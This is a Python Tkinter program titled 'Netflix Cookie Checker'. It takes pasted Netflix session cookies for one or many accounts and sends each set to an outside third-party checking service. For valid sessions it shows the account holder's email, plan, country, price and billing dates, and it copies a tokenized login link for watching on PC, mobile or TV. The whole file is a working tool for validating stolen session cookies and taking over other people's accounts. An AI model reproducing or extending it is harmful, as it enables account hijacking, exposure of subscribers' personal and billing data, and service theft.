import tkinter as tk
from tkinter import messagebox
import requests
import json
import threading
import re

class UnifiedCookieChecker:
    def __init__(self, master):
        self.master = master
        master.title("Netflix Cookie Checker")
        master.geometry("1150x750")
        master.configure(bg="#12131C")

        # Global variables to store token links dynamically
        self.token_link = ""

        # --- LEFT PANEL: INPUT & DEBUG LOGS ---
        left_panel = tk.Frame(master, bg="#12131C")
        left_panel.pack(side="left", fill="both", expand=True, padx=(15, 7), pady=15)

        lbl_input = tk.Label(left_panel, text="📥 Paste Netflix Cookies (Raw or JSON Array):", font=("Arial", 11, "bold"), bg="#12131C", fg="#A9B1D6")
        lbl_input.pack(anchor="w", pady=(0, 5))
        
        self.text_area = tk.Text(left_panel, height=12, bg="#1A1B26", fg="#C0CAF5", insertbackground="white", font=("Consolas", 10), bd=0, highlightthickness=1, highlightbackground="#24283B")
        self.text_area.pack(fill="x", pady=(0, 10))

        self.check_button = tk.Button(
            left_panel, text="⚡ Check Cookies", command=self.start_checking, 
            font=("Arial", 12, "bold"), bg="#7AA2F7", fg="#12131C", 
            activebackground="#6183D6", activeforeground="#12131C", 
            bd=0, cursor="hand2", padx=10, pady=8
        )
        self.check_button.pack(fill="x", pady=(0, 15))

        lbl_debug = tk.Label(left_panel, text="⚙️ Live Debug Console:", font=("Arial", 11, "bold"), bg="#12131C", fg="#A9B1D6")
        lbl_debug.pack(anchor="w", pady=(0, 5))

        self.debug_console = tk.Text(left_panel, bg="#101014", fg="#9ECE6A", font=("Consolas", 9), state="disabled", bd=0, highlightthickness=1, highlightbackground="#24283B")
        self.debug_console.pack(fill="both", expand=True)

        # --- RIGHT PANEL: DASHBOARD VIEW ---
        right_panel = tk.Frame(master, bg="#12131C")
        right_panel.pack(side="right", fill="both", expand=True, padx=(7, 15), pady=15)

        # Large Live Status Header Banner
        self.status_banner = tk.Label(right_panel, text="READY - WAITING FOR INPUT", font=("Arial", 13, "bold"), bg="#1A1B26", fg="#565F89", pady=12)
        self.status_banner.pack(fill="x", pady=(22, 15))

        # --- Dashboard Navigation Bar ---
        self.nav_frame = tk.Frame(right_panel, bg="#12131C")
        self.nav_frame.pack(fill="x", pady=(0, 10))

        self.btn_prev = tk.Button(
            self.nav_frame, text="◀ Previous", command=self.show_prev, 
            font=("Arial", 9, "bold"), bg="#24283B", fg="#A9B1D6", 
            activebackground="#414868", activeforeground="#FFFFFF", 
            bd=0, cursor="hand2", padx=10, pady=4, state="disabled"
        )
        self.btn_prev.pack(side="left", padx=10)

        self.lbl_counter = tk.Label(
            self.nav_frame, text="0 / 0", font=("Arial", 10, "bold"), 
            bg="#12131C", fg="#565F89"
        )
        self.lbl_counter.pack(side="left", expand=True)

        self.btn_next = tk.Button(
            self.nav_frame, text="Next ▶", command=self.show_next, 
            font=("Arial", 9, "bold"), bg="#24283B", fg="#A9B1D6", 
            activebackground="#414868", activeforeground="#FFFFFF", 
            bd=0, cursor="hand2", padx=10, pady=4, state="disabled"
        )
        self.btn_next.pack(side="right", padx=10)

        # Dashboard Grid Panel
        grid_frame = tk.Frame(right_panel, bg="#12131C")
        grid_frame.pack(fill="both", expand=True)
        
        grid_frame.columnconfigure(0, weight=1)
        grid_frame.columnconfigure(1, weight=1)

        # Field Layout Configuration
        self.cards = {}
        fields = [
            ("Email", "EMAIL:"), ("Plan", "PLAN:"),
            ("Country", "COUNTRY:"), ("Price", "PRICE:"),
            ("Membership", "MEMBERSHIP:"), ("Member Since", "MEMBER SINCE:"),
            ("Next Billing", "NEXT BILLING:"), ("Email Verified", "EMAIL VERIFIED:")
        ]
        
        for index, (key, label_text) in enumerate(fields):
            row = index // 2
            col = index % 2
            
            card = tk.Frame(grid_frame, bg="#1A1B26", bd=0, highlightthickness=1, highlightbackground="#24283B")
            card.grid(row=row, column=col, padx=6, pady=6, sticky="nsew")
            grid_frame.rowconfigure(row, weight=1)
            
            lbl_title = tk.Label(card, text=label_text, font=("Arial", 9, "bold"), bg="#1A1B26", fg="#565F89")
            lbl_title.pack(anchor="w", padx=12, pady=(10, 2))
            
            lbl_val = tk.Label(card, text="-", font=("Arial", 11, "bold"), bg="#1A1B26", fg="#C0CAF5")
            lbl_val.pack(anchor="w", padx=12, pady=(0, 10))
            
            self.cards[key] = lbl_val

        # --- BUTTON BAR: TOKEN LINKS COPY MECHANISMS ---
        button_container = tk.Frame(right_panel, bg="#12131C")
        button_container.pack(fill="x", pady=(15, 5))
        button_container.columnconfigure(0, weight=1)
        button_container.columnconfigure(1, weight=1)
        button_container.columnconfigure(2, weight=1)

        self.btn_pc = tk.Button(
            button_container, text="💻 PC Watch", command=lambda: self.copy_link("PC"),
            font=("Arial", 11, "bold"), bg="#10B981", fg="#FFFFFF", activebackground="#059669", activeforeground="#FFFFFF",
            bd=0, cursor="hand2", pady=12, state="disabled"
        )
        self.btn_pc.grid(row=0, column=0, padx=5, sticky="ew")

        self.btn_mobile = tk.Button(
            button_container, text="📱 Mobile", command=lambda: self.copy_link("Mobile"),
            font=("Arial", 11, "bold"), bg="#3B82F6", fg="#FFFFFF", activebackground="#2563EB", activeforeground="#FFFFFF",
            bd=0, cursor="hand2", pady=12, state="disabled"
        )
        self.btn_mobile.grid(row=0, column=1, padx=5, sticky="ew")

        self.btn_tv = tk.Button(
            button_container, text="📺 TV Connect", command=lambda: self.copy_link("TV"),
            font=("Arial", 11, "bold"), bg="#8B5CF6", fg="#FFFFFF", activebackground="#7C3AED", activeforeground="#FFFFFF",
            bd=0, cursor="hand2", pady=12, state="disabled"
        )
        self.btn_tv.grid(row=0, column=2, padx=5, sticky="ew")

        self.results_list = []
        self.current_index = 0

    # --- LOGIC & SYSTEM PROCESSING ---

    def log_debug(self, message):
        self.debug_console.config(state="normal")
        self.debug_console.insert(tk.END, message + "\n")
        self.debug_console.see(tk.END)
        self.debug_console.config(state="disabled")

    def parse_cookies(self, cookie_string):
        cookie_string = cookie_string.strip()
        all_accounts = [] # This will hold groups of cookies
        
        self.log_debug("[Parser] Scanning text for JSON blocks...")
        json_blocks = re.findall(r'\[\s*\{.*?\}\s*\]', cookie_string, re.DOTALL)
        
        if json_blocks:
            self.log_debug(f"[Parser] Found {len(json_blocks)} JSON block(s). Extracting...")
            for block in json_blocks:
                try:
                    parsed_json = json.loads(block)
                    if isinstance(parsed_json, dict):
                        parsed_json = [parsed_json]
                        
                    account_cookies = []
                    for item in parsed_json:
                        account_cookies.append({
                            "name": str(item.get("name", "")).strip(),
                            "value": str(item.get("value", "")).strip(),
                            "domain": str(item.get("domain", ".netflix.com")).strip(),
                            "path": str(item.get("path", "/")).strip(),
                            "httpOnly": bool(item.get("httpOnly", False)),
                            "secure": bool(item.get("secure", False))
                        })
                    
                    if account_cookies:
                        all_accounts.append(account_cookies)
                        
                except json.JSONDecodeError as e:
                    self.log_debug(f"[Parser Error] Failed parsing a JSON block: {str(e)}")
                    continue
            
            if all_accounts:
                return all_accounts

        # Fallback: Parse raw Key=Value string sequence
        self.log_debug("[Parser] No valid JSON found. Trying raw Key=Value parsing...")
        cookies = []
        for line in cookie_string.split('\n'):
            line = line.strip()
            if "=" in line and not line.startswith("--") and not line.startswith("{"):
                for cookie in line.split(';'):
                    cookie = cookie.strip()
                    if not cookie or '=' not in cookie:
                        continue
                    try:
                        name, value = cookie.split('=', 1)
                        if " " in name: 
                            continue 
                            
                        cookies.append({
                            "name": name.strip(), "value": value.strip(), 
                            "domain": ".netflix.com", "path": "/", 
                            "httpOnly": False, "secure": False
                        })
                    except ValueError:
                        continue
                        
        if cookies:
            return [cookies] # Wrap in a list so it matches the list-of-lists structure
            
        return []

    def start_checking(self):
        # Reset previous data view
        self.token_link = ""
        self.btn_pc.config(state="disabled")
        self.btn_mobile.config(state="disabled")
        self.btn_tv.config(state="disabled")
        for key in self.cards:
            self.cards[key].config(text="-")

        # Reset navigation state
        self.results_list.clear()
        self.current_index = 0
        self.update_nav_buttons()
            
        threading.Thread(target=self.run_checker, daemon=True).start()

    def run_checker(self):
        cookie_string = self.text_area.get("1.0", tk.END).strip()
        if not cookie_string:
            self.log_debug("[System] Action cancelled: Input field empty.")
            return

        parsed_accounts = self.parse_cookies(cookie_string)
        if not parsed_accounts:
            self.log_debug("[System] Action cancelled: Formatting structures are unrecognized.")
            return

        self.log_debug(f"[System] Preparing to check {len(parsed_accounts)} account(s)...")

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Accept": "text/event-stream"
        }

        # Loop through each account and send a separate request
        for index, account_cookies in enumerate(parsed_accounts):
            self.log_debug(f"\n[Network] --- Checking Account {index + 1} of {len(parsed_accounts)} ---")
            
            payload = {
                "cookies": account_cookies,
                "stream": True,
                "concurrency": 2,
                "skipNFToken": False
            }
            
            try:
                response = requests.post(
                    "https://burn-netflix-gen-v2.vercel.app/api/check", 
                    json=payload, headers=headers, stream=True, timeout=25
                )

                if response.status_code != 200:
                    self.log_debug(f"[Network Error] Target rejected connection with code {response.status_code}")
                    continue # Skip to the next account

                current_event = None

                for line in response.iter_lines():
                    if line:
                        decoded_line = line.decode('utf-8').strip()
                        self.log_debug(f"[Raw SSE] {decoded_line}")
                        
                        if decoded_line.startswith("event:"):
                            current_event = decoded_line.replace("event:", "", 1).strip()
                        
                        elif decoded_line.startswith("data:"):
                            json_str = decoded_line.replace("data:", "", 1).strip()
                            try:
                                result_payload = json.loads(json_str)
                                self.master.after(0, self.process_api_data, current_event, result_payload)
                            except json.JSONDecodeError:
                                continue

            except Exception as e:
                self.log_debug(f"[Exception Encountered] Details: {str(e)}")
                
        self.log_debug("\n[System] All accounts have been processed.")

    def process_api_data(self, event_type, payload):
        """Fixed dynamic extractor matching the exact nested structure of the SSE chunks."""
        
        if event_type == "result":
            res_info = payload.get("result", payload)
            
            # Store the result in our memory list
            self.results_list.append(res_info)
            
            # If this is the very first result to arrive, show it immediately
            if len(self.results_list) == 1:
                self.current_index = 0
                self.render_dashboard_data()
            
            # Update the navigation text (e.g., "Account 1 of 2")
            self.update_nav_buttons()
        
        elif event_type == "status":
            msg = payload.get("message", "Processing...")
            self.status_banner.config(text=f"⏳ {msg.upper()}", bg="#1A1B26", fg="#7AA2F7")

    def copy_link(self, device_type):
        """Copies the appropriate tokenized URL variation based on the button clicked."""
        if not self.token_link:
            return
            
        final_url = self.token_link
        
        # Modify the login query target parameters depending on target platform selection
        if device_type == "Mobile":
            final_url = self.token_link.replace("netflix.com/?nftoken=", "netflix.com/?nftoken=") # Adjust if endpoint changes structure
        elif device_type == "TV":
            final_url = "https://www.netflix.com/tv8" # Or format with pin context if returned by the response structure
            
        self.master.clipboard_clear()
        self.master.clipboard_append(final_url)
        self.master.update()
        messagebox.showinfo("Success", f"Tokenized {device_type} URL copied to clipboard!")


    def show_prev(self):
        if self.current_index > 0:
            self.current_index -= 1
            self.render_dashboard_data()
            self.update_nav_buttons()

    def show_next(self):
        if self.current_index < len(self.results_list) - 1:
            self.current_index += 1
            self.render_dashboard_data()
            self.update_nav_buttons()

    def update_nav_buttons(self):
        total = len(self.results_list)
        if total == 0:
            self.lbl_counter.config(text="0 / 0")
            self.btn_prev.config(state="disabled")
            self.btn_next.config(state="disabled")
            return

        self.lbl_counter.config(text=f"Account {self.current_index + 1} of {total}")
        self.btn_prev.config(state="normal" if self.current_index > 0 else "disabled")
        self.btn_next.config(state="normal" if self.current_index < total - 1 else "disabled")

    def render_dashboard_data(self):
        """Updates the visual cards based on the currently selected index."""
        if not self.results_list:
            return
            
        res_info = self.results_list[self.current_index]
        is_valid = res_info.get("valid", False)
        
        if is_valid:
            self.status_banner.config(text="✓ VALID ACCOUNT FOUND", bg="#1E2D24", fg="#9ECE6A")
            
            self.cards["Email"].config(text=res_info.get("email", "N/A"))
            self.cards["Plan"].config(text=res_info.get("plan", "N/A"))
            self.cards["Country"].config(text=res_info.get("countryOfSignup", "N/A"))
            self.cards["Price"].config(text=res_info.get("price", "N/A"))
            self.cards["Membership"].config(text=res_info.get("membershipStatus", "N/A"))
            self.cards["Member Since"].config(text=res_info.get("memberSince", "N/A"))
            self.cards["Next Billing"].config(text=res_info.get("nextBilling", "N/A"))
            
            email_ver = "Yes" if res_info.get("emailVerified") else "No"
            self.cards["Email Verified"].config(text=email_ver)
            
            self.token_link = res_info.get("nftokenLink", "")
            if self.token_link:
                self.btn_pc.config(state="normal")
                self.btn_mobile.config(state="normal")
                self.btn_tv.config(state="normal")
        else:
            self.status_banner.config(text="✗ INVALID COOKIES", bg="#3D1F28", fg="#F7768E")

if __name__ == "__main__":
    root = tk.Tk()
    app = UnifiedCookieChecker(root)
    root.mainloop()